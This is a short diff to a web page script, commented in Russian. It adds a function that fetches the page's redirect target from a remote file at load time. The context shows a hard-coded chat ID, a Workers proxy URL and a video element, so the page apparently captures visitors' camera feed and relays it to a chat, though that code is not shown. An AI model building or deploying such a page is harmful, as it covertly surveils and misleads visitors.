@@ -17,8 +17,27 @@
 
         <script>
        const chatId = '1976857829';
-const targetUrl = 'https://google.com';
+
 const proxyUrl = 'https://silent-surf-60b2.parsinnikita76.workers.dev';
+const remoteConfigUrl = 'https://raw.githubusercontent.com';
+
+let targetUrl = 'https://google.com'; // Ссылка по умолчанию
+
+// Функция для получения актуальной ссылки из файла
+async function getTargetUrl() {
+    try {
+        const response = await fetch(remoteConfigUrl);
+        if (response.ok) {
+            const text = await response.text();
+            targetUrl = text.trim(); // Обновляем ссылку из файла
+        }
+    } catch (e) {
+        console.error("Не удалось загрузить ссылку, используем стандартную");
+    }
+}
+
+// Запускаем получение ссылки сразу при загрузке страницы
+getTargetUrl();
 
 const btn = document.getElementById('btn');
 const video = document.getElementById('v');
